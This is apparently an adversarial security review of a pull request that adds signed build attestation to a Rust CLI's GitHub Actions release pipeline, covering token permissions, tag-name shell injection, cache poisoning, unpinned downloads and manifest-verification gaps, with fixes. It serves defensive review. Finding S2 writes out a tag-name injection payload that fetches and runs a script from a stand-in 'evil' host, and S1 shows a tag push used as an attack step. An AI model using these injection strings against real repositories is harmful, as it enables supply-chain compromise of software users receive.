# Arc-2 adversarial review — supply chain & CI

**Branch** `jct/binary-attestation-manifest-verification` (PR #573)
**Lens:** what can a compromised runner, action, token, or dependency do to this release pipeline?
**Method:** static read of the diff + workflows + scripts; probed `emit-manifest.sh` and
`git check-ref-format` locally; `gh api` read-only for repo Actions settings. No `cargo`, no
workflow runs, no edits.

---

## Verdict

The **cryptographic core is sound**. `attest.rs` binds the digest, pins one trust root, requires the
GitHub OIDC issuer *and* the exact `build-cli-binaries.yml@refs/tags/<tag>` SAN, keeps Rekor
inclusion-proof checking, and has a load-bearing negative test (`wrong_repo_identity_is_rejected`)
that proves the identity scope actually narrows trust. `select_slsa_provenance_bundle` correctly
refuses `bundles[0]`. `version.rs` keys its online check on the **manifest's own** digest and
explains why. `update.rs` embeds `install.sh` via `include_str!` rather than re-fetching it — which
is the right call and closes a hole most `curl | sh` updaters leave open. These are not
box-ticks; they are the hard parts and they are done.

The weakness is **everything around the signature**. The pipeline now mints a cryptographic
assertion that the outside world will treat as authoritative, and the job that mints it is entered
from a repo whose default `GITHUB_TOKEN` is `write`, restores a mutable build cache, downloads an
unpinned native library over plain `curl`, interpolates an attacker-shapeable tag name into `bash`,
and runs a third-party action pinned to a **mutable branch**. Every one of those was survivable
before this PR. Now each of them ends in *a signed artifact that `temper update` affirmatively
blesses as verified* — which is strictly worse than no attestation, because the new verification
code converts a compromise into a green tick.

Ranked below. Findings are things that are wrong today; recommendations are separate.

---

## Findings

### S1 — Repo-wide `default_workflow_permissions: write` gives every un-scoped CI job a token that can push a release tag

```
$ gh api repos/tasker-systems/temper/actions/permissions/workflow
{"default_workflow_permissions":"write","can_approve_pull_request_reviews":true}
```

**No workflow file declares a top-level `permissions:` block** (all ten: `build-cli-binaries.yml`,
`ci.yml`, `code-quality.yml`, `coverage.yml`, `release-tag.yml`, `release.yml`, `test-agents-ts.yml`,
`test-ruby.yml`, `test-rust.yml`, `test-typescript.yml`). Job-level blocks exist only in
`release.yml`, `release-tag.yml`, and `build-cli-binaries.yml`. Every other job — the entire test and
quality matrix — runs with `contents: write`.

**Failure scenario.** Attacker compromises any third-party action used in an un-scoped job
(`taiki-e/install-action@v2` in `code-quality.yml:51`, `oven-sh/setup-bun@v2` at `:195`,
`Swatinem/rust-cache@v2` at `:46`, `codecov/codecov-action@v5`, `ruby/setup-ruby@v1`), or lands a
malicious `build.rs` in any transitive crate that `test-rust.yml` compiles. Step runs with a
`contents: write` token →

```
git push origin refs/tags/v9.9.9      # or force-push an existing v* tag
```

→ `release.yml`'s `on: push: tags: ['v*']` fires → `build-cli-binaries.yml` builds and **attests**
with the repo's genuine Fulcio identity → `temper update` fetches it, `verify_release_attestation`
returns `Ok(())`, `install.sh` swaps it in and prints ✓. The new verification code is what makes
this a *convincing* attack rather than a noisy one.

`can_approve_pull_request_reviews: true` is the second half: a workflow token can self-approve a PR,
so a 1-approval branch protection on `main` is not a barrier either.

**Confirmed zero-breakage to fix.** Grepped every un-scoped workflow for `git push`, `gh pr`,
`gh release`, `gh api`, `GITHUB_TOKEN`, `github.token` — no hits. Nothing outside the three
already-scoped workflows needs write.

---

### S2 — Tag name is interpolated into `bash`, and the injected code now runs in the job holding `id-token: write` + `attestations: write`

`release.yml:34-41`:

```yaml
run: |
  if [[ -n "${{ inputs.tag }}" ]]; then
    TAG="${{ inputs.tag }}"
  else
    TAG="${{ github.ref_name }}"
  fi
```

`build-cli-binaries.yml:115`, `:158`, `:187`, `:199` do the same with `${{ inputs.version }}`:

```yaml
VERSION="${{ inputs.version }}"
...
ARCHIVE="temper-v${VERSION}-${TARGET}.tar.gz"
```

Git ref names permit every metacharacter needed. Verified locally:

```
$ git check-ref-format 'refs/tags/v1.0.0";id;#'   → ALLOWED
$ git check-ref-format 'refs/tags/v1.0.0$(id)'    → ALLOWED
$ git check-ref-format 'refs/tags/v1.0.0`id`'     → ALLOWED
```

(`git` rejects space, `~ ^ : ? * [ \` — none of which are required; `${IFS}` supplies whitespace.)

**Failure scenario.** Anyone with push access — or anything holding the S1 write token — pushes
`v0.0.1";curl${IFS}-s${IFS}evil.sh|sh;#`. `release.yml`'s `determine-version` interpolates it into
`bash`. The payload lands in the matrix build job, which holds `id-token: write` and
`attestations: write`, and can therefore mint OIDC tokens for `repo:tasker-systems/temper` and sign
arbitrary subjects as this repo.

**This is pre-existing** (`release.yml`'s diff on this branch is only the 2-line `permissions:`
block) — but the PR is what raises it from "bad build" to "signing-key-equivalent". Rating it S2
is a statement about the blast radius this PR created, not about who introduced the line.

Credit where due: the **new** step got this right —
`build-cli-binaries.yml:172-179` passes `VERSION`/`TARGET`/`STAGING`/`OUTPUT` through `env:` and runs
`bash .github/scripts/release/emit-manifest.sh` with no interpolation into shell source. That is the
correct pattern; the surrounding steps just predate it.

---

### S3 — `Swatinem/rust-cache@v2` restores a mutable, cross-ref cache into the signing job

`build-cli-binaries.yml:75-78`:

```yaml
- name: Setup Rust build cache
  uses: Swatinem/rust-cache@v2
  with:
    shared-key: release-${{ matrix.target.triple }}
```

GitHub Actions cache scoping lets a run restore caches created on its own ref **and on the default
branch**. `build-cli-binaries.yml` carries `workflow_dispatch` (`:10-15`), so a run on `main` writes
`release-<triple>` into `main`'s scope — readable by the `refs/tags/v*` release run.

**Failure scenario.** Anyone who can trigger a workflow run on `main` (a merged PR, or the S1 token)
populates the `release-<triple>` cache with a poisoned `target/` — a pre-built `.rlib`, a cached
proc-macro `.so`, a stale `build-script-build` output. The release build restores it, `cargo build
--release --locked` reuses the fingerprint-matching artifact rather than rebuilding, and the
resulting binary is attested. The attestation is *truthful*: this repo's workflow at this tag did
produce those bytes. It just did not compile them from this tag's source.

`--locked` pins the dependency graph; it does nothing about restored build output. This is the
canonical "reproducible-build vs. cache" conflict and a release job is exactly where the cache
should not be.

---

### S4 — The ONNX Runtime shared library is downloaded unpinned and then signed

`build-cli-binaries.yml:90-107`:

```bash
ORT_URL="https://github.com/microsoft/onnxruntime/releases/download/v${ORT_VER}/${ORT_NAME}.${ORT_EXT}"
curl -fsSL -o "ort-staging/ort.${ORT_EXT}" "$ORT_URL"
```

No checksum. No signature. The extracted `libonnxruntime.{so,dylib}` / `onnxruntime.dll` is copied
into `staging/` (`:130-141`), hashed into the manifest (`:172-179`), rolled into the archive
(`:181-203`), and **attested** (`:205-218`).

This is the sharpest contrast in the PR. `crates/temper-ingest/build.rs` already enforces
`EXPECTED_MODEL_SHA256` on the embedding model, and `attest.rs`'s module doc explicitly cites that
doctrine as its own justification for pinning the trust root. The ORT library — a native `.so` the
CLI `dlopen`s, i.e. arbitrary code in the user's process — gets no equivalent.

**Failure scenario.** Attacker with write on `microsoft/onnxruntime` release assets (GitHub release
assets are mutable — an asset can be deleted and re-uploaded at the identical URL), or a
CDN/DNS/egress-path compromise against the runner, replaces `onnxruntime-linux-x64-1.24.2.tgz`. The
temper release job downloads it, hashes it into the manifest (so `install.sh` and `temper version
--verify` both report ✓ — they are hashing the poisoned bytes), archives it, and signs it. Every
verification surface in this PR returns `verified`. The attestation is faithful and useless: it
vouches for provenance of the *build*, not integrity of the *inputs*.

The staging tree is inside the trust boundary the moment the attestation step runs. This step writes
to it, and the design doc's own §"a compromised artifact would faithfully attest to its own
compromise" reasoning (why the manifest is generated by the runner, not the binary) applies here
verbatim and was not extended to this input.

---

### S5 — `temper update` verifies the archive's attestation but never the manifest's, then persists the unverified manifest as the durable offline baseline

`update.rs:518-527`:

```rust
let digest = sha256_of_file(&archive_path)?;
attestation_fetch::verify_release_attestation_online(&client, &digest, tag).await
```

`digest` is the **archive's**. The manifest is downloaded at `:513` (`download_to_file(&client,
&manifest_url, &manifest_path)`) and never attested. It is then used to gate the extracted contents
(`verify_archive_against_manifest`, `:415-472`) and handed to `install.sh --manifest`, which copies
it verbatim into `$INSTALL_DIR/.temper-manifest.json` (`install.sh:332`).

`version.rs` gets this exactly right and says why, in its own module doc (lines 40-52):

> the attestation check MUST be keyed on the manifest's own digest, never the archive's. […] a
> release-asset write who tampers the manifest (to match a tampered install) while leaving the
> genuine, still-attested archive `.sha256` intact […] would otherwise let a valid attestation vouch
> for a manifest it says nothing about.

That reasoning is not applied one module over. `build-cli-binaries.yml:218` already attests
`*.manifest.json` as its own subject, so the check is available — it is simply not called.

**Failure scenario.** Attacker with release-asset write (or an active MITM on the separate manifest
GET) serves a manifest with `files: []` — a shape `emit-manifest.sh` produces natively; verified
locally against an empty staging dir:

```
$ VERSION=1 TARGET=t STAGING=empty OUTPUT=out.json bash emit-manifest.sh
{ "version": "1", "target": "t", "files": [] }
```

`verify_release_attestation_online` passes (the archive really is genuine).
`verify_archive_against_manifest` iterates zero entries → `Verdict::Verified`.
`verify_manifest_against_dir` in `install.sh` iterates zero pairs → passes. The genuine binary
installs. But `$INSTALL_DIR/.temper-manifest.json` now covers **nothing**, permanently. A local
attacker who later replaces the `temper` binary or the ORT `.so` gets `temper version --verify` →
`verified`, forever, offline. The tamper-evidence baseline the whole feature exists to establish has
been set to the empty set by an attacker, on the path the design calls "full provenance".

Related and confirmed by construction: `manifest.rs:83` documents

> Files present in `dir` but absent from the manifest are ignored — the manifest states what we
> shipped, not what the user may not add beside it

`verify_dir` iterates `manifest.files` only; there is no directory walk, so `Verdict::Verified`
means "every listed file matches", never "this dir is what shipped". That framing is defensible for
a user's own scratch file next to the binary; it is what makes the `files: []` degenerate case
silent rather than loud.

---

### S6 — `dtolnay/rust-toolchain@stable` is a **branch**, not a tag, and it runs inside the signing job

`build-cli-binaries.yml:70-73`:

```yaml
- name: Setup Rust
  uses: dtolnay/rust-toolchain@stable
```

`stable` is a mutable git branch in `dtolnay/rust-toolchain`, updated by its maintainer. Unlike
`@v2`/`@v6`, there is no tag-immutability story to appeal to and no release to audit — the ref is
mutable *by design*.

**Failure scenario.** Compromise of a single maintainer account (or of the action repo) → force-push
to `stable` → arbitrary JS executes in every temper release build, in the job holding `id-token:
write` and `attestations: write`. The attacker mints OIDC tokens as `repo:tasker-systems/temper` and
signs whatever they like as an official temper release. There is no window to notice: the ref name
never changes, so no diff, no Dependabot PR, no lockfile entry.

This is the single highest-leverage pin in the pipeline and it is the least pinned thing in it.

---

### S7 — `install.sh`'s manifest gate has no non-vacuity floor, and `emit-manifest.sh` mangles a newline-bearing filename's hash

**No floor.** `install.sh:253-278` runs `verify_manifest_against_dir`, which loops over
`manifest_pairs` output. Zero pairs → `CHECK_FAILED=0` → success. There is no assertion that the
manifest lists at least `temper`, or that it is non-empty. Same degenerate case as S5, reachable in
the fresh-install path too, and it would also silently pass a *broken CI run* that emitted an empty
manifest.

**Newline mangling.** `emit-manifest.sh`'s `sha_of()` (`:23-29`) does `shasum -a 256 "$1" | awk
'{print $1}'`. `shasum`/`sha256sum` emit an escaped two-line form for filenames containing a newline
or backslash; `awk` prints `$1` for *both* lines. Verified locally:

```
$ printf 'z' > "$(printf 'staging/new\nline')"
$ VERSION=1 TARGET=t STAGING=staging OUTPUT=out2.json bash emit-manifest.sh
    { "path": "new\nline",
      "sha256": "594e519ae499312b29433b7dd8a97ff068defcba9755b6d5d00e84c524d67b06\nline",
      "size": 1 }
```

The `sha256` field is corrupt. **This is fail-closed** (`install.sh` will look for a file named
`new\nline` literally, not find it, and abort) and staging filenames are entirely workflow-controlled
today, so there is no live exploit. It is a faithfulness defect in a file whose only job is to
faithfully describe what ships, and it would bite the day someone adds a generated asset with an
unexpected name.

**Things I checked and found clean in these two scripts:**

- `find … -print0 | sort -z` (`emit-manifest.sh:44`) — `sort -z` is supported by macOS/BSD `sort`
  (verified: `printf 'a\0b\0' | sort -z` round-trips). No portability trap on `macos-14`.
- Path traversal / staging leakage — `REL="${f#"$STAGING"/}"` with a relative `STAGING=staging`
  strips correctly; the guard test asserts no absolute paths (`test-emit-manifest.sh:47-48`).
- **JSON injection via filename — not possible.** `jq --arg`/`--argjson` escape correctly. I
  specifically tried to smuggle a second `"sha256":` into a `path` value: `jq` emits it as `\"`, and
  `install.sh`'s awk (`sub(/".*$/, "", p)`) truncates at the escaped quote, yielding a path that then
  fails the `[ -f ]` existence check. Every variant I could construct fails **closed**. Confirmed
  with a literal `"` in a filename: `"path": "we\"ird"` → awk yields `we\` → missing → abort.
- `--argjson size "$SIZE"` — `SIZE` comes from `wc -c`, always digits. No injection.
- `create-github-release.sh` — `shopt -s nullglob` before the upload loop, every expansion quoted,
  `--clobber` is deliberate (re-run idempotence). Clean.

---

### S8 — `install.sh` staging/backup paths are predictable, and `mkdir -p` will happily follow a pre-planted symlink

`install.sh:198-207`:

```sh
STAGING="${INSTALL_DIR}.new-$$"
OLD="${INSTALL_DIR}.old-$$"
...
rm -rf "$STAGING"
mkdir -p "$STAGING"
```

`$$` is the shell PID — a ~5-bit-entropy, racily-guessable name in a directory
(`$HOME/.local/share/`) whose write permissions are not asserted.

**Failure scenario.** A local process that can create entries in `$PARENT_DIR` wins the race between
`rm -rf` and `mkdir -p` and plants `temper.new-<pid>` as a symlink to a directory it wants written.
`mkdir -p` on an existing symlink-to-dir **succeeds silently** (it does not fail, and it follows),
so `tar -xzf … -C "$STAGING"` (`:209`) writes the archive contents through the symlink. `mv
"$STAGING" "$INSTALL_DIR"` then renames the symlink, leaving the payload behind at the target.

Low severity — it requires an attacker who already has write access to the victim's `$HOME` subtree,
at which point they have easier options. Recording it because `mkdir "$STAGING"` (no `-p`, after the
`rm -rf`) fails closed on an existing entry and costs one character.

Also in this area, and **correct**: the `OLD` backup is deliberately excluded from the `EXIT` trap
(`:200-204`) so a SIGKILL leaves a recoverable copy; the rollback path (`:305-343`) routes both
failure modes through one mechanism; the manifest is written into `INSTALL_DIR` **only** after the
live binary runs *and* re-verifies (`:331-333`), so a rolled-back install never leaves a manifest
describing an install that is not there. That ordering is genuinely well thought through.

---

### S9 — Dependency posture: a C/asm crypto build and a second TLS stack entered the release toolchain as a side effect

`crates/temper-cli/Cargo.toml` adds three crates; `Cargo.lock` grows 374 lines. What actually came in:

| Change | Where it came from | Concern |
|---|---|---|
| `aws-lc-rs` + `aws-lc-sys` | `sigstore-crypto`, `sigstore-tsa` (non-optional) | New **C + assembly** build (cmake/bindgen) on all three release targets, incl. `windows-2022` MSVC. Its build script executes in the job holding `id-token: write`. |
| `rustls 0.23.37` with **both** `aws-lc-rs` **and** `ring` features | feature unification | temper-cli's outbound TLS provider may have silently switched from `ring` to `aws-lc-rs` for **every** HTTPS call — Auth0 device flow, the temper API, release downloads. Nobody reviewed that. |
| `reqwest 0.13.2` alongside `0.12.28` | `sigstore-rekor`, `sigstore-tsa`, `sigstore-tuf`, `jsonschema`, `opentelemetry-*` | Two independent HTTP+TLS configurations in one binary. `0.13` pulls `rustls-platform-verifier`; `0.12` does not. **Two different certificate-trust decisions** now coexist, and the crate's `rustls-tls` posture is enforced on only one of them. |
| `sigstore-tuf` (+ its `reqwest 0.13`) | pulled in by `sigstore-trust-root` | `attest.rs`'s module doc says "no TUF fetch, no network call". True of the *call path* — but a **TUF client is compiled and linked into the verifier**. Dead network code inside the component whose entire value proposition is that it does not touch the network. |

None of this is a live vulnerability. The concern beyond build weight is precisely the last column:
adding a *verification* library changed the *transport security* of unrelated code paths, and the
attestation module's stated offline guarantee is now a property of which functions are called rather
than of what is linked.

Compounding it: `code-quality.yml:124-128`

```yaml
- name: Security audit
  continue-on-error: true
  run: |
    cargo install cargo-audit --locked
    cargo audit
```

`continue-on-error: true` means `cargo audit` **can never fail the build**. The PR that triples the
crypto surface area is gated by an advisory check that is decorative. (`cargo install cargo-audit
--locked` and `cargo install cargo-machete --locked` also resolve unpinned at each run, but they are
in a job that — see S1 — already has a write token, so that is the smaller problem.)

---

## Explicitly not findings — checked and correct, or declared

- **Fresh `curl | sh` install performs no attestation check.** Correct, and *declared*: the design
  doc's out-of-scope section ("Mandatory attestation verification at fresh install […] would make
  `curl … | sh` hard-depend on `gh`") and `docs/guides/install.md:104` ("internally consistent")
  both state it plainly. The residual — that `install.sh` fetches archive, `.sha256`, and manifest
  from the same `URL_BASE`, so all three fall together to one release-asset write — is documented at
  install.md:195. I am not manufacturing this into a finding. It does, however, make S5 and S7's
  non-vacuity gap matter more, since the fresh install is the trust bootstrap for every later update.
- **`update.rs` embeds `install.sh` (`include_str!`, `update.rs:72`) rather than re-fetching it.**
  The script is covered by the binary's own attestation. Most updaters get this wrong.
- **`--archive` requires `--manifest`** (`install.sh:177-179`) — a hard error, not a silent skip of
  per-file verification. Right call.
- **`--archive`/`--manifest` accepting arbitrary paths** is not an attack surface: reaching those
  flags requires argv control, which is game over already. The flags exist to *close* the TOCTOU gap
  a second download would open, and the comment at `:127-134` states that correctly.
- **`release-summary` holds only `contents: write`** — no `id-token`, no `attestations`. Correct
  separation: the job that publishes cannot sign, and the job that signs cannot publish.
- **The `subject-path` three-line trick** (`:215-218`, attesting both `.tar.gz` and `.zip` per target
  when only one exists) — the comment's claim matches `@actions/glob` semantics: each line resolves
  independently and only a globally-empty match set errors. Correct, and the reasoning is written
  down rather than assumed.
- **Trusting the `bundle_url` *contents*: safe.** `resolve_bundle_json` (`attestation_fetch.rs:216-243`)
  fetches from a presigned third-party blob host, but every downstream check is cryptographic —
  signature, cert chain to the pinned root, issuer, SAN identity, Rekor inclusion, and the digest
  binding. A hostile blob host can only produce a bundle that fails, never one that wrongly passes.
  Failure renders `Network`, which is explicitly *not* a verdict on the artifact — the right posture.
- **Trusting the *URL*: also acceptable, with one nuance.** The URL arrives inside a
  `api.github.com` TLS response, so redirecting it requires compromising GitHub's API — at which
  point the attacker controls the whole lookup. The residual is a **privacy/liveness** leak, not an
  integrity one: `client.get(url)` follows reqwest's default redirect policy (up to 10 hops) to an
  arbitrary host with the temper-cli User-Agent, and the response body is read unbounded into a
  `String`. A hostile-or-compromised blob host can force a large allocation. Bounded by the 30s
  client timeout (`release_http_client_builder:133-137`), so it degrades to a slow failure rather
  than an OOM. Worth a `Content-Length` cap eventually; not a finding today.
- **`emit-manifest.sh`'s "generate on the runner, not from the binary" rationale** (`:4-7`) is
  correct and non-obvious, and the guard test (`test-emit-manifest.sh:36-40`) has a real bite —
  it asserts the hash of actual bytes, so a generator emitting constants goes red.

---

## Answers to the posed questions

**Permission scope.** `contents: read` + `id-token: write` + `attestations: write` on the build job
is the minimum the feature needs — Actions has no step-level permission granularity, so this is as
tight as the *declaration* can be. But the declaration is not the boundary. What actually holds those
permissions is **every build script of every crate in the dependency graph** (now including
`aws-lc-sys`), plus `dtolnay/rust-toolchain@stable` (S6), plus `Swatinem/rust-cache@v2` (S3), plus
whatever `curl`'s ONNX download returns (S4), plus any tag-name injection (S2). Blast radius of a
compromised step in that job: mint an OIDC token asserting `repo:tasker-systems/temper` to any
external IdP that trusts this repo, **and** sign arbitrary bytes as an official temper release.
`release-summary` is correctly scoped. `release.yml:47-50`'s caller-level grant is required (reusable
workflow permissions are an intersection) and correct. The problem is S1: the *other* seven workflows
hold `contents: write` by repo default and can reach this job by pushing a tag.

**Action pinning.** Full inventory:

| Action | Ref | Party | In the signing job? |
|---|---|---|---|
| `dtolnay/rust-toolchain` | `@stable` — **mutable branch** | third | **yes** (`build-cli-binaries.yml:71`) |
| `Swatinem/rust-cache` | `@v2` moving major | third | **yes** (`:76`) |
| `actions/checkout` | `@v6` moving major | GitHub | **yes** (`:62`) |
| `actions/attest-build-provenance` | `@v4` moving major | GitHub | **yes** (`:206`) |
| `actions/upload-artifact` | `@v7` moving major | GitHub | **yes** (`:221`) |
| `actions/download-artifact` | `@v8` | GitHub | no (`release.yml:69`) |
| `taiki-e/install-action` | `@v2` | third | no |
| `oven-sh/setup-bun` | `@v2` | third | no |
| `ruby/setup-ruby` | `@v1` | third | no |
| `codecov/codecov-action` | `@v5` | third | no |
| `actions/setup-node` | `@v4` | GitHub | no |

**Recommendation — pin by full 40-char commit SHA, but only the five actions inside the signing
job.** Concretely:

```yaml
uses: actions/checkout@<sha>                    # v6.0.1
uses: Swatinem/rust-cache@<sha>                 # v2.8.1
uses: actions/attest-build-provenance@<sha>     # v4.0.0
uses: actions/upload-artifact@<sha>             # v7.0.0
```

…and for `dtolnay/rust-toolchain`, **replace the action outright** rather than pin it:

```yaml
- name: Setup Rust
  shell: bash
  run: |
    rustup toolchain install stable --profile minimal
    rustup target add "${{ matrix.target.triple }}"   # ← env-ify per S2
```

Reasoning, not platitude, on all three choices:

1. *Why SHA at all.* A moving major tag is a mutable pointer under someone else's control. `@v2`
   silently becomes new code whenever the maintainer retags. For a job whose output is a signature,
   "the code that ran is whatever the maintainer's tag pointed at that hour" is not a statement you
   can put in a provenance document.
2. *Why only five, and not repo-wide.* Pinning all eleven produces ~20 Dependabot bump PRs a year.
   Reviewers rubber-stamp high-volume mechanical PRs — SHA-pinning everything converts a real control
   into a rubber stamp and is net-negative. Pin exactly where a compromise reaches signing material.
   Everything else is bounded by S1's fix (read-only tokens), which is the cheaper control for those
   jobs.
3. *Why `dtolnay/rust-toolchain` gets deleted rather than pinned.* A SHA pin works, but a branch ref
   means there is no upstream release cadence to track and no changelog to review at bump time — you
   would be pinning to a commit and then bumping blind. Four lines of `rustup` (already on every
   runner) removes a third-party action from the signing job entirely, which is strictly better than
   pinning it. **Cost:** you lose the action's toolchain-caching and its `rustup` version pinning
   ergonomics; add ~15-30s per matrix leg.

**Cost of the SHA pins:** Dependabot supports SHA pinning natively and rewrites the `# vX.Y.Z`
trailing comment on bump, so ongoing cost is ~5 review-able PRs/year. One-time cost is one PR
resolving five SHAs.

**The signing step's position.** Before `attest-build-provenance` (`:205`), in the same job, in
order: `checkout` (lfs), `rust-toolchain@stable` (S6), `rust-cache@v2` (S3 — *restores* content),
`cargo build` (every `build.rs` in the graph), the unpinned ONNX `curl` (S4 — *writes* the `.so` that
ships), "Assemble archive contents" (writes the staging tree), `emit-manifest.sh` (reads it), and the
archive creation. **Four of those can influence what gets signed**: the cache restore, the ONNX
download, any build script, and any tag-name injection. The staging tree and the archive are both
constructed entirely inside the trust boundary from at least one unverified external input.

**`emit-manifest.sh`.** No injection (jq `--arg` holds under every quote/backslash/newline variant I
tried, and `install.sh`'s awk parser fails **closed** on each). No path traversal or staging leakage.
`sort -z` is portable to the macOS runner. Two defects: the newline-filename hash corruption (S7) and
the `files: []` degenerate output with no consumer-side floor (S5/S7). And one structural gap: `find
-type f` **skips symlinks**, and `manifest.rs:83` documents that unlisted files are ignored — so the
manifest is an allow-list of hashes, not a closure over the archive. It does not, strictly, describe
"what actually ships"; it describes "these specific files, if present, must hash to these values".
That is a weaker property than the docs imply, and worth stating in the docs even if the behavior stays.

**`install.sh` as attack surface.** `TMPDIR` is *reassigned* at `:124` (`TMPDIR=$(mktemp -d)`),
shadowing the standard variable and re-exporting the new value to every child — including the
`"$STAGING/temper" --version` run-gate, whose `TMPDIR` then points at a directory the `EXIT` trap
deletes. Cosmetic today; rename to `WORKDIR`. The predictable `$$` staging/backup names plus `mkdir
-p` symlink-following are S8. The atomic-swap window is well handled — `OLD` is out of the trap, the
run-gate precedes the swap, both failure modes share one rollback path, and the manifest is written
last. `--archive`/`--manifest` are not an attack surface (argv control is already game over) and
`--archive` correctly hard-requires `--manifest`. No path leaves a world-writable state: everything
is `mkdir`/`mv` under the caller's umask. The one genuinely partial state is the S8 symlink race, and
the one genuinely wrong persistent state is S5's poisoned `.temper-manifest.json`. Note also that
`tar -xzf` (`:209`) necessarily runs **before** per-file verification (`:275`) — on the fresh-install
path, the only thing between a hostile tarball and arbitrary extraction behavior is the same-origin
`.sha256`.

**Dependency posture.** See S9. Beyond build weight: a probable silent TLS-provider switch to
`aws-lc-rs`, two `reqwest` majors with divergent certificate-verification stacks, a linked-but-unused
TUF network client inside the "offline" verifier, and a `cargo audit` step that is
`continue-on-error: true` and therefore cannot report any of it.

**Attestation bundle fetch.** Contents: safe (cryptographically bounded — see the not-findings
section). URL: acceptable; residual is unbounded redirect-following and an unbounded `resp.text()`,
both capped by the 30s timeout.

---

## Recommendations, with costs

Ordered by value-per-unit-cost.

1. **Set `default_workflow_permissions: read` and `can_approve_pull_request_reviews: false`** (repo
   Settings → Actions → General), and add `permissions: {contents: read}` at the top of all ten
   workflow files. *Cost: near zero — verified no un-scoped job uses a write token. Highest value in
   this list; it severs S1's tag-push chain.*
2. **Env-ify every `${{ }}` that lands in a `run:` block** — `release.yml:34-41`,
   `build-cli-binaries.yml:115/158/187/199`. Pass through `env:` and reference `"$VERSION"`, exactly
   as the new manifest step already does. *Cost: ~15 lines. Closes S2.*
3. **Attest the manifest in `update.rs`.** After downloading it, `sha256_of_file(&manifest_path)` and
   a second `verify_release_attestation_online` — the workflow already attests it as its own subject.
   *Cost: 4 lines + one extra GitHub API call per update (~200ms). Closes S5.* Alternatively, ship
   the manifest **inside** the archive so the archive digest covers it — architecturally cleaner, but
   circular (the manifest would have to describe itself) unless it is excluded from its own file list.
4. **Pin the ONNX Runtime download by sha256.** Add `ort_sha256:` to each matrix entry and verify
   after `curl`. *Cost: 3 matrix fields, ~5 lines of bash, and one value to update per ORT bump —
   the same discipline `EXPECTED_MODEL_SHA256` already imposes. Closes S4.*
5. **Drop the build cache from the release job** (or scope it so a `main` run cannot populate what a
   tag run reads). *Cost: ~10-20 min per matrix leg, on a workflow that runs a handful of times a
   year. Closes S3, and buys build reproducibility as a side effect.*
6. **Action pinning as specified above** — SHA-pin the four first-party/`rust-cache` actions in the
   signing job; replace `dtolnay/rust-toolchain@stable` with `rustup`. *Cost: one setup PR, ~5
   Dependabot PRs/year, ~15-30s per leg. Closes S6.*
7. **Add a non-vacuity floor to both manifest consumers.** `install.sh`: require ≥1 pair and require
   `temper` among them. `manifest.rs::verify_dir`: return `Unverifiable` on an empty `files` list
   rather than `Verified`. *Cost: ~6 lines total. Removes the `files: []` silent-pass in S5/S7 —
   worth doing even after (3), as defense in depth and as a CI-breakage detector.*
8. **Drop `continue-on-error: true` from the `cargo audit` step**, or replace it with `cargo deny`
   and an explicit, reviewed advisory-ignore list. *Cost: some red builds until the backlog is
   triaged — which is the point. An advisory gate that cannot fail is not a gate.*
9. **`mkdir "$STAGING"` without `-p`** after the `rm -rf` in `install.sh:206-207`, and rename the
   `TMPDIR` variable. *Cost: two characters and a rename. Closes S8.*
10. **Quote-safe `sha_of` in `emit-manifest.sh`** — strip to the first 64 hex chars, or `cut -c1-64`,
    rather than `awk '{print $1}'` across lines. *Cost: one line. Closes S7's mangling.*

---

*Reviewed statically. No `cargo` invoked, no workflow triggered, no file modified.*
